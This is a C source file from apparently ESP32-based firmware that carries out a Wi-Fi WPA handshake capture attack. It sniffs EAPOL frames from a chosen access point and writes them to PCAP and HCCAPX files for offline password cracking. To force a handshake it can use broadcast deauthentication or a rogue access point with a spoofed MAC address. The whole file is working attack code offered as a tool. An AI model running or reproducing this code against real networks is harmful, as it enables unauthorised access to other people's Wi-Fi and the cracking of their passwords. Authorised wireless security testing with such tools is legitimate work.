/**
 * @file attack_handshake.c
 * @author risinek (risinek@gmail.com), SameerAlSahab (sameeralsahab54@gmail.com)
 * @date 2026
 * @brief Implements handshake attacks with frame validation.
 */

#include "attack_handshake.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi_types.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"
#include "hydra_ssd1306_display.h"

static const char *TAG = "main:attack_handshake";
static attack_handshake_methods_t method = -1;
static const wifi_ap_record_t *ap_record = NULL;
static uint8_t captured_eapol_frames = 0;

static TaskHandle_t monitor_task_handle = NULL;
static bool is_running = false;

#define MIN_EAPOL_REQUIRED 4

/**
 * @brief Callback for DATA_FRAME_EVENT_EAPOLKEY_FRAME event.
 */
static void eapolkey_frame_handler(void *args, esp_event_base_t event_base,
                                   int32_t event_id, void *event_data)
{
    if (!is_running) return;

    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;


    if (frame->rx_ctrl.sig_len <= 0 || frame->rx_ctrl.sig_len > 1500) {
        ESP_LOGW(TAG, "Malformed EAPOL frame dropped. Guarding memory.");
        return;
    }

    captured_eapol_frames++;


    attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);
    pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
    hccapx_serializer_add_frame((data_frame_t *) frame->payload);

    ESP_LOGI(TAG, "EAPOL %d/%d captured securely.", captured_eapol_frames, MIN_EAPOL_REQUIRED);


    oled_log(OLED_LINE1, 2, "EAPOL: %d/%d", captured_eapol_frames, MIN_EAPOL_REQUIRED);
}

void attack_handshake_monitor_task(void *arg)
{
    while (is_running) {

        if (ap_record == NULL) {
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }

        if (captured_eapol_frames >= MIN_EAPOL_REQUIRED) {
            ESP_LOGI(TAG, "Handshake SUCCESS (%d frames).", captured_eapol_frames);

            attack_update_status(FINISHED);

            attack_handshake_stop();

            monitor_task_handle = NULL;
            vTaskDelete(NULL);
        }

        vTaskDelay(pdMS_TO_TICKS(1000)); // Check every second, no timeouts
    }


    monitor_task_handle = NULL;
    vTaskDelete(NULL);
}


void attack_handshake_start(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Starting handshake attack...");
    captured_eapol_frames = 0;
    method = attack_config->method;
    ap_record = attack_config->ap_records[0];
    is_running = true;

    oled_log(OLED_HEAD, 3, "Handshake Active");
    oled_log(OLED_LINE1, 3, "Sniffing EAPOL...");

    pcap_serializer_init();
    hccapx_serializer_init(ap_record->ssid, strlen((char *)ap_record->ssid));
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(ap_record->primary);
    frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
    ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));

    switch(attack_config->method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
            attack_method_broadcast(ap_record, 5);
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_ROGUE_AP");
            attack_method_rogueap(ap_record);
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_PASSIVE");
            break;
        default:
            ESP_LOGW(TAG, "Method unknown! Fallback to PASSIVE");
    }


    if (monitor_task_handle == NULL) {
        xTaskCreate(&attack_handshake_monitor_task, "handshake_mon", 3072, NULL, 5, &monitor_task_handle);
    }
}

void attack_handshake_stop(){
    if (!is_running) return;

    is_running = false;

    switch(method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            break;
        default:
            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
    }

    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &eapolkey_frame_handler));

    ap_record = NULL;
    method = -1;


    if (captured_eapol_frames >= MIN_EAPOL_REQUIRED) {
        ESP_LOGI(TAG, "Handshake success! %d frames captured securely.", captured_eapol_frames);

        oled_log(OLED_HEAD, 4, "HANDSHAKE SUCCESS!");
        oled_log(OLED_LINE1, 4, "Saved PCAP");
    } else {
        ESP_LOGW(TAG, "Handshake aborted manually! Only %d frame(s) captured.", captured_eapol_frames);


        oled_log(OLED_HEAD, 4, "HANDSHAKE ABORTED");
        oled_log(OLED_LINE1, 4, "Incomplete Capture");
    }

    ESP_LOGD(TAG, "Handshake attack safely stopped.");
}
